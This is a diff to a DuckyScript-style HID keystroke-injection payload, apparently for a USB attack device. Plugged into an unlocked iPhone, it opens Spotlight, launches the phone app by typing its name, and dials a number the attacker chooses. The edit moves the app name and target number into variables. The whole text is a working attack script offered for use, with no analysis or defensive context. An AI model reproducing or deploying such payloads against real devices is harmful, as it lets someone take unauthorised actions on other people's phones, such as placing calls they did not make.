@@ -8,22 +8,24 @@
 * REM #                                              |
 * REM ################################################
 
+ATTACKMODE HID
 
 * REM Requirements:
 * REM     - The phone must be unlocked
 
-* REM Tested on:
-* REM     - iPhone 14
-* REM     - iOS 16.4.1
+QUACK REM VARIABLES
+* REM 1) You need to change the name of the application according to the language you have on your phone.
+PHONE-APP-NAME='Telefono'
+* REM 2) You must set the phone number to be called
+NUMBER='...'
 
+QUACK DELAY 2000
 QUACK GUI SPACE
 QUACK DELAY 300
-* REM You need to change the name of the application according to the language you have on your phone.
-QUACK STRING #PHONE-APP-NAME
+QUACK STRING $PHONE-APP-NAME
 QUACK ENTER
 QUACK DELAY 1000
 QUACK BACKSPACE
-* REM You must set the phone number to be called
-QUACK STRING #NUMBER
+QUACK STRING $NUMBER
 QUACK DELAY 500
 QUACK ENTER
